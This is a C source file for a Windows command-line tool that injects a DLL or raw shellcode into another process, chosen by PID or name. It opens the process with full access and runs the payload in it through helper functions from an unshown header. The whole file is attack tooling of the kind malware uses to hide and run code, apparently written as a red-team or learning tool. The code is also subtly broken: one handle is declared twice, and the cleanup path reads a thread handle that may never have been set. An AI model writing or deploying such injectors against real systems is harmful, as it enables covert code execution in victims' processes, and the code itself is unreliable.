/**
 * @file inject.c
 * @brief Command-line interface for DLL or shellcode injection using inject_tools.h.
 *
 * This program parses command-line arguments to select a target process
 * (by PID or executable name) and a payload (DLL path or shellcode file),
 * then demonstrate how to use the functions provided by inject_tools.h
 * to perform injection and execute the payload in the remote process.
 */

#include "inject_tools.h"


// Global flags and parameters
BOOL            is_using_pid            = FALSE;
BOOL            is_using_name           = FALSE;
BOOL            is_using_dll            = FALSE;
BOOL            is_using_shellcode      = FALSE;

unsigned long   target_process_pid      = 0;
wchar_t*        target_process_name     = NULL;
wchar_t*        input_file_name         = NULL;

/**
 * @brief Prints usage instructions to the console.
 *
 * Displays the program name, accepted command-line options, and their descriptions.
 *
 * @param prog_name The name or path of the executable (typically argv[0]).
 */
void print_usage(const wchar_t* prog_name)
{
    wprintf(L"[+] Usage: %s [-p pid | -n process_name] [-d dll_path | -s shellcode_file] [-h | -help | --help]\n", prog_name);
    wprintf(L"[+] Options:\n");
    wprintf(L"[+]   -p pid             Target process by PID\n");
    wprintf(L"[+]   -n name            Target process by executable name\n");
    wprintf(L"[+]   -d dll_path        Inject DLL into target process\n");
    wprintf(L"[+]   -s shellcode_file  Inject shellcode from file into target process\n");
    wprintf(L"[+]   -h, -help, --help  Show this usage information\n");
}

/**
 * @brief Parses and validates command-line arguments.
 *
 * Sets global flags indicating how to identify the target process and
 * which payload to inject. Validates that exactly one target selector
 * (PID or name) and one payload selector (DLL or shellcode) have been provided.
 * Prints errors or usage information if validation fails.
 *
 * @param argc Number of command-line arguments.
 * @param argv Array of wide-character argument strings.
 * @return TRUE if arguments are valid and parsing succeeded; FALSE otherwise.
 */

BOOL parse_args(int argc, wchar_t* argv[])
{
    for (int idx = 1; idx < argc; ++idx)
    {
        if (wcscmp(argv[idx], L"-p") == 0)
        {
            is_using_pid = TRUE;
            is_using_name = FALSE;
            ++idx < argc ? (target_process_pid = strtoul(argv[idx], NULL, 10)) : (void)0;
        }
        else if (wcscmp(argv[idx], L"-n") == 0)
        {
            is_using_name = TRUE;
            is_using_pid = FALSE;
            ++idx < argc ? (target_process_name = argv[idx]) : (void)0;
        }
        else if (wcscmp(argv[idx], L"-d") == 0)
        {
            is_using_dll = TRUE;
            is_using_shellcode = FALSE;
            ++idx < argc ? (input_file_name = argv[idx]) : (void)0;
        }
        else if (wcscmp(argv[idx], L"-s") == 0)
        {
            is_using_shellcode = TRUE;
            is_using_dll = FALSE;
            ++idx < argc ? (input_file_name = argv[idx]) : (void)0;
        }
        else if (wcscmp(argv[idx], L"-h") == 0 || wcscmp(argv[idx], L"-help") == 0 || wcscmp(argv[idx], L"--help") == 0)
        {
            print_usage(argv[0]);
            return FALSE;
        }
    }

    // Validate parsed arguments
    if (is_using_pid && target_process_pid == 0)
    {
        wprintf(L"[!] Error: PID must be non-zero.\n");
        return FALSE;
    }

    if (is_using_name && target_process_name == NULL)
    {
        wprintf(L"[!] Error: Process name must be specified.\n");
        return FALSE;
    }

    if (input_file_name == NULL)
    {
        wprintf(L"[!] Error: You must specify a DLL path (-d) or shellcode file (-s).\n");
        return FALSE;
    }

    wprintf(L"[+] Arguments parsed successfully.\n");
    return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
    BOOL    ret_val     = EXIT_FAILURE;
    HANDLE  target_proc = NULL;

    if (!parse_args(argc, argv))
    {
        print_usage(argv[0]);
        goto cleanup;
    }

    if (is_using_pid) { wprintf(L"[+] target_pid: %lu\n", target_process_pid); }
    if (is_using_name) { wprintf(L"[+] target_name: %s\n", target_process_name); }
    wprintf(L"[+] input_file_name: %s\n", input_file_name);
    
    if (is_using_name)
    {
        target_process_pid = GetPIDByName(target_process_name, &target_process_pid);
        if (!target_process_pid)
        {
            goto cleanup;
        }
    }

    // Open the process
    HANDLE target_proc = OpenProcess(PROCESS_ALL_ACCESS, NULL, target_process_pid);
    if (!target_proc)
    {
        wprintf(L"[!] OpenProcess on target process failed. Error: %s (0x%08X)\n", _wcserror(GetLastError()), GetLastError());
        goto cleanup;
    }

    // Inject the payload
    LPVOID payload_addr = (is_using_dll) ? InjectDLL(target_proc, input_file_name) : InjectShellcode(target_proc, input_file_name);
    if (!payload_addr)
    {
        wprintf(L"[!] Failed to inject dll. Error: %s (0x%08X)\n", _wcserror(GetLastError()), GetLastError());
        goto cleanup;
    }

    // Run the payload
    HANDLE injected_thread = (is_using_dll) ? RunPayloadDLL(target_proc, payload_addr) : RunPayloadShellcode(target_proc, payload_addr);
    if (!injected_thread)
    {
        wprintf(L"[!] Failed to run payload. Error: %s (0x%08X)\n", _wcserror(GetLastError()), GetLastError());
        if (!VirtualFreeEx(target_proc, payload_addr, 0, MEM_RELEASE))
        {
            wprintf(L"[!] Oh my... a double error! VirtualFreeEx was unable to free the reserved memory in target process. Error: %s (0x%08X)\n", _wcserror(GetLastError()), GetLastError());
        }
        goto cleanup;
    }

    ret_val = EXIT_SUCCESS;

cleanup:
    if (target_proc)        { CloseHandle(target_proc); }
    if (injected_thread)    { CloseHandle(injected_thread); }

    return ret_val;
}